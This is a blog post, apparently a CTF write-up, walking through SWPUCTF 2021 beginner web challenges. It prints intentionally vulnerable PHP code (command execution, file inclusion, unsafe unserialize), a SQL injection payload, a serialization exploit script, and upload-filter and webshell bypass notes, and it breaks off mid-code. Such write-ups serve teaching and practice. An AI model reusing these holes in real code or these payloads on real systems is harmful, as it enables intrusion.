<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="SWPUCTF, hybcx&#39;s blog">
    <meta name="description" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>SWPUCTF | hybcx&#39;s blog</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">hybcx&#39;s blog</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">hybcx&#39;s blog</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">SWPUCTF</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/CTF%E8%B5%9B%E4%BA%8B/">
                                <span class="chip bg-color">CTF赛事</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/CTF%E8%B5%9B%E4%BA%8B/" class="post-category">
                                CTF赛事
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2024-03-03
                </div>
                

                

                

                

                
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1>[SWPUCTF 2021 新生赛]gift_F12</h1>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303154602248.png" alt=""></p>
<p>简单的js源码泄露</p>
<h1>[SWPUCTF 2021 新生赛]jicao</h1>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">'index.php'</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">"flag.php"</span>);<br><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'id'</span>];<br><span class="hljs-variable">$json</span>=<span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'json'</span>],<span class="hljs-literal">true</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$id</span>==<span class="hljs-string">"wllmNB"</span>&amp;&amp;<span class="hljs-variable">$json</span>[<span class="hljs-string">'x'</span>]==<span class="hljs-string">"wllm"</span>)<br>{<span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">只需要id=wllmNB,随后get传参?json={"x":<span class="hljs-string">"wllm"</span>}<br></code></pre></td></tr></tbody></table></figure>
<p>但这里如果用bp的话，需要添加<code>Content-Type: application/x-www-form-**urlencoded</code>才可以</p>
<p>因为有post传参，因此必须进行url编码</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303155609807.png" alt="image-20240303155609807"></p>
<h1>[SWPUCTF 2021 新生赛]easy_md5</h1>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br> <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br> <span class="hljs-keyword">include</span> <span class="hljs-string">'flag2.php'</span>;<br> <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'name'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'password'</span>])){<br>    <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'name'</span>];<br>    <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'password'</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$name</span> != <span class="hljs-variable">$password</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$name</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>)){<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    }<br>    <span class="hljs-keyword">else</span> {<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"wrong!"</span>;<br>    }<br> <br>}<br><span class="hljs-keyword">else</span> {<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">'wrong!'</span>;<br>}<br><span class="hljs-meta">?&gt;</span><br>wrong!<br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303160406743.png" alt="image-20240303160406743"></p>
<h1>[SWPUCTF 2021 新生赛]include</h1>
<p>页面说让我们串file参数试试，传入之后知道是伪协议读取</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">"allow_url_include"</span>,<span class="hljs-string">"on"</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Content-type: text/html; charset=utf-8"</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>)){<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">'flag 在flag.php中'</span>;<br>}<span class="hljs-keyword">else</span>{<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"传入一个file试试"</span>;<br>}<br><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;"</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;"</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;"</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;"</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;"</span>;<br><span class="hljs-keyword">include_once</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-meta">?&gt;</span> flag 在flag.php中<br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303161800565.png" alt="image-20240303161800565"></p>
<h1>[SWPUCTF 2021 新生赛]easy_sql</h1>
<p>简单SQL注入</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">?wllm=-<span class="hljs-number">1</span>' union select <span class="hljs-number">1</span>, <span class="hljs-built_in">group_concat</span>(flag), <span class="hljs-number">3</span> from test_tb--+<br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303163823373.png" alt="image-20240303163823373"></p>
<h1>[SWPUCTF 2021 新生赛]easyrce</h1>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303164036596.png" alt="image-20240303164036596"></p>
<h1>[SWPUCTF 2021 新生赛]caidao</h1>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303165909827.png" alt="image-20240303165909827"></p>
<p>RCE或者蚁剑连接</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303165922060.png" alt="image-20240303165922060"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303165930107.png" alt="image-20240303165930107"></p>
<p>不过这里蚁剑连接时候总是报错，之后修改了编码方式才通过。不理解（被waf了？？？）</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303165955408.png" alt="image-20240303165955408"></p>
<h1>[SWPUCTF 2021 新生赛]Do_you_know_http</h1>
<p>第一个改UA头即可，第二个改IP为本地，302跳转即可</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303173135507.png" alt="image-20240303173135507"></p>
<h1>[第五空间 2021]WebFTP</h1>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303174306125.png" alt="image-20240303174306125"></p>
<p>不知道考什么，直接扫目录得到phpinfo.php，搜索flag即可</p>
<h1>[SWPUCTF 2021 新生赛]babyrce</h1>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'url'</span>])) {<br>  <span class="hljs-variable">$ip</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'url'</span>];<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/ /"</span>, <span class="hljs-variable">$ip</span>)){<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">'nonono'</span>);<br>  }<br>  <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$ip</span>);<br>  <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303174740360.png" alt="image-20240303174740360"></p>
<h1>[SWPUCTF 2021 新生赛]ez_unserialize</h1>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">"cl45s.php"</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">wllm</span></span>{<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;admin =<span class="hljs-string">"user"</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-string">"123456"</span>;<br>    }<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">"admin"</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd === <span class="hljs-string">"ctf"</span>){<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">"flag.php"</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        }<span class="hljs-keyword">else</span>{<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;admin;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">"Just a bit more!"</span>;<br>        }<br>    }<br>}<br><br><span class="hljs-variable">$p</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'p'</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$p</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>链子如下：</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">wllm</span></span>{<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;<br><br>}<br><span class="hljs-variable">$pop</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">wllm</span>();<br><span class="hljs-variable">$pop</span>-&gt;admin = <span class="hljs-string">'admin'</span>;<br><span class="hljs-variable">$pop</span>-&gt;passwd = <span class="hljs-string">'ctf'</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pop</span>));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303175341797.png" alt="image-20240303175341797"></p>
<p>这里放一个对上述构造函数以及反序列化的优先级解释（我感觉GPT回答没错）</p>
<p>在 PHP 的序列化中，如果在序列化字符串中指定了对象的属性值，那么在反序列化时，会使用这些指定的属性值来初始化对象，而不会调用构造函数。因此，在传入序列化字符串时，你可以这样指定 admin 和 passwd 的值：</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">O:<span class="hljs-number">4</span>:<span class="hljs-string">"wllm"</span>:<span class="hljs-number">2</span>:{s:<span class="hljs-number">5</span>:<span class="hljs-string">"admin"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"user"</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">"passwd"</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">"123456"</span>;}<br></code></pre></td></tr></tbody></table></figure>
<p>这里的优先级是序列化字符串中指定的属性值优先于构造函数中的默认值。反序列化时会使用这些指定的属性值来初始化对象的属性。</p>
<h1>[SWPUCTF 2021 新生赛]easyupload2.0</h1>
<p>这道题也是没想到，因为基本没见过（但确实基础。。。）</p>
<p>这里上传试了几次发现ban了php、ini、htaccess，我们可以考虑PHP文件其他的拓展名php3、php5、phtml、pht等我们一一尝试</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303185953676.png" alt="image-20240303185953676"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303185944862.png" alt="image-20240303185944862"></p>
<p>找环境变量或者phpinfo都可</p>
<h1>[SWPUCTF 2021 新生赛]easyupload1.0</h1>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303190251141.png" alt="image-20240303190251141"></p>
<p>发现修改为该MIME类型即可</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303190329438.png" alt="image-20240303190329438"></p>
<h1>[SWPUCTF 2021 新生赛]no_wakeup</h1>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Content-type:text/html;charset=utf-8"</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">"class.php"</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HaHaHa</span></span>{<br><br><br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{<br>            <span class="hljs-variable language_">$this</span>-&gt;admin =<span class="hljs-string">"user"</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-string">"123456"</span>;<br>        }<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>{<br>            <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;passwd);<br>        }<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">"admin"</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd === <span class="hljs-string">"wllm"</span>){<br>                <span class="hljs-keyword">include</span>(<span class="hljs-string">"flag.php"</span>);<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            }<span class="hljs-keyword">else</span>{<br>                <span 